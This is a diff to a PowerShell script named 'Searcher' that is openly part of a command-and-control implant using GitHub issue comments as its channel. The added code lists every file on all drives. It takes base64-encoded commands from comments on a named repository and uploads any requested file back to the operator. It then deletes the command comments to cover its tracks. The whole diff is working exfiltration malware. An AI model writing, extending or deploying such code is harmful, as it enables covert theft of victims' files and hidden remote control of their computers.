@@ -1,22 +1,31 @@
-#ENTRY POINT
-#Write startup message to console
-Write-Console -Body ("Searcher starting.") -IssueNumber $issueNumber
-Write-Host "DEBUG: Searcher starting."
-
-#Check if searcher log exists; if not, create it.
-$searcherLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\searcher.log"
-try
+function Update-SearcherLog
 {
-    If([System.IO.File]::Exists($searcherLogPath))
-    {
-        Write-Console -Body ("Searcher log found OK.") -IssueNumber $issueNumber
-        Write-Host "DEBUG: Searcher log found OK."
-    }
-    Else
-    {
-        Write-Console -Body ("Searcher log not found. Attempting to create it...") -IssueNumber $issueNumber
-        Write-Host "DEBUG: Searcher log not found. Attempting to create it..."
+	[CmdletBinding()] Param
+    (
+        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("logPath","path","log","searcherPath")][String] $searcherLogPath,
+        [Parameter(Mandatory = $True, ValueFromPipeline = $True)][Alias("issueNum","issue","issNum","iss")][int] $issueNumber
+    )
 
+    try 
+    {
+        #If searcher log already exists, clear it.
+        If([System.IO.File]::Exists($searcherLogPath))
+        {
+            Clear-Content -Path $searcherLogPath
+            Write-Console -Body ("Cleared the old searcher log. Attempting to recreate it...") -IssueNumber $issueNumber
+            Write-Host "DEBUG: Cleared the old searcher log. Attempting to recreate it..."
+        }
+    }
+    catch 
+    {
+        Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to clear the old searcher log. Exiting. Error: " + $Error)
+	    Write-Console -Body "Exception thrown trying to clear the old searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
+	    Write-Host "DEBUG: Exception thrown trying to clear the old searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	    Exit
+    }
+    
+    try 
+    {
         #Make sure there is at least one entry in the searcher log even if no files with the below specified criteria are found
         Add-Content -Path $searcherLogPath -Value "BEGIN SEARCHER LOG"
 
@@ -26,9 +35,10 @@ try
 
         #Get all logical drives
         $drives = (Get-PSDrive | Select-Object -ExpandProperty 'Name' | Select-String -Pattern '^[a-z]$')
-        
+
         ForEach($drive in $drives)
         {
+            #Turn the drive object into a string, and trim the whitespace
             $drive = ($drive | Out-String).Trim()
             $files = Get-ChildItem -Path ($drive + ":\") -Recurse -File -Name
             ForEach($file in $files)
@@ -51,6 +61,38 @@ try
         }
         $fileArray = $fileList.ToArray()
         Add-Content -Path $searcherLogPath -Value $fileArray
+        Write-Console -Body ("Searcher log written to file.") -IssueNumber $issueNumber
+        Write-Host "DEBUG: Searcher log written to file."
+    }
+    catch
+    {
+        Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to create the searcher log. Exiting. Error: " + $Error)
+	    Write-Console -Body "Exception thrown trying to create the searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
+	    Write-Host "DEBUG: Exception thrown trying to create the searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	    Exit
+    }
+}
+
+#ENTRY POINT
+#Write startup message to console
+Write-Console -Body ("Searcher starting.") -IssueNumber $issueNumber
+Write-Host "DEBUG: Searcher starting."
+
+#Check if searcher log exists; if not, create it.
+$searcherLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\searcher.log"
+try
+{
+    If([System.IO.File]::Exists($searcherLogPath))
+    {
+        Write-Console -Body ("Searcher log found OK.") -IssueNumber $issueNumber
+        Write-Host "DEBUG: Searcher log found OK."
+    }
+    Else
+    {
+        Write-Console -Body ("Searcher log not found. Attempting to create it...") -IssueNumber $issueNumber
+        Write-Host "DEBUG: Searcher log not found. Attempting to create it..."
+
+        Update-SearcherLog -SearcherLogPath $searcherLogPath -IssueNumber $issueNumber
 
         #Confirm that the searcher file was created OK.
         If(!([System.IO.File]::Exists($searcherLogPath)))
@@ -134,13 +176,73 @@ catch
 	Exit
 }
 
-#If command is to upload a particular file, for each file:
-    #check if that file still exists
-    #If yes, upload it
+#Process searcher commands.
+try 
+{
+    ForEach($comment in $comments)
+    {
+        If($comment.body -like "PKG{SEARCHER}:*")
+        {
+            $bodyText = ($comment.body).replace("PKG{SEARCHER}:","")
+            $bodyText = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($bodyText))
+            
+            #Process UPLOAD_FILE command.
+            If($bodyText -like "COMMAND{UPLOAD_FILE}:*")
+            {
+                Write-Console -Body ("Processing UPLOAD_FILE command with comment ID " + $comment.ID + "...") -IssueNumber $issueNumber
+                Write-Host ("DEBUG: Processing UPLOAD_FILE command with comment ID " + $comment.ID + "...")
+                $targetFilePath = ($bodyText).replace("COMMAND{UPLOAD_FILE}:","")
+                If([System.IO.File]::Exists($targetFilePath))
+                {
+                    Write-Console -Body ("Found target file at " + $targetFilePath + ". Attempting to upload it...") -IssueNumber $issueNumber
+                    Write-Host ("DEBUG: Found target file with path " + $targetFilePath + ". Attempting to upload it...")
+                    $fileBytes = [System.Convert]::ToBase64String($(Get-Content -ReadCount 0 -Encoding Byte -Path $targetFilePath))
+                    Send-PackageMessage -PackageName "FILE" -IssueNumber $issueNumber -Body ($fileBytes)
+                    Write-Console -Body ("Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...") -IssueNumber $issueNumber
+                    Write-Host ("DEBUG: Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...")
+                    Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                    Write-Console -Body ("Deleted UPLOAD_FILE command comment.") -IssueNumber $issueNumber
+                    Write-Host ("DEBUG: Deleted UPLOAD_FILE command comment.")
+                }
+                ElseIf(!([System.IO.File]::Exists($targetFilePath)))
+                {
+                    Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command.")
+                    Write-Console -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting.") -IssueNumber $issueNumber
+                    Write-Host "DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting."; Start-Sleep -s 600
+                    Exit
+                }
+            }
+            #Process REFRESH_SEARCHER_LOG command.
+            ElseIf($bodyText -like "COMMAND{REFRESH_SEARCHER_LOG}")
+            {
+                Write-Console -Body ("Processing REFRESH_SEARCHER_LOG command with comment ID " + $comment.ID + "...") -IssueNumber $issueNumber
+                Write-Host ("DEBUG: Processing REFRESH_SEARCHER_LOG command with comment ID " + $comment.ID + "...")
 
-    #Use comment ID to determine if it's newer than the latest searcher log. Maybe delete executed commands?
+                #Update searcher log.
+                Write-Console -Body ("Updating searcher log...") -IssueNumber $issueNumber
+                Write-Host ("DEBUG: Updating searcher log...")
+                Update-SearcherLog -SearcherLogPath $searcherLogPath -IssueNumber $issueNumber
 
-#If command is to refresh the log, do so, upload it.
+                #Upload searcher log and delete the command.
+                Send-PackageMessage -Package "SEARCHER" -IssueNumber $issueNumber -Body (Get-Content -Path $searcherLogPath -Raw)
+                Write-Console -Body ("Upload complete. Attempting to delete the REFRESH_SEARCHER_LOG command comment...") -IssueNumber $issueNumber
+                Write-Host ("DEBUG: Upload complete. Attempting to delete the REFRESH_SEARCHER_LOG command comment...")
+                Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                Write-Console -Body ("Deleted REFRESH_SEARCHER_LOG command comment.") -IssueNumber $issueNumber
+                Write-Host ("DEBUG: Deleted REFRESH_SEARCHER_LOG command comment.")
+            }
+        }
+    }
+}
+catch 
+{
+    Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to process searcher commands. Exiting. Error: " + $Error)
+	Write-Console -Body "Exception thrown trying to process searcher commands. Notified C2. Exiting." -IssueNumber $issueNumber
+	Write-Host "DEBUG: Exception thrown trying to process searcher commands. Notified C2. Exiting."; Start-Sleep -s 600
+	Exit
+}
 
-#Send searcher confirmation message
-#Exit
+#Send completion confirmation message.
+Write-Console -Body ("Searcher execution complete.") -IssueNumber $issueNumber
+Write-Host ("DEBUG: Searcher execution complete.")
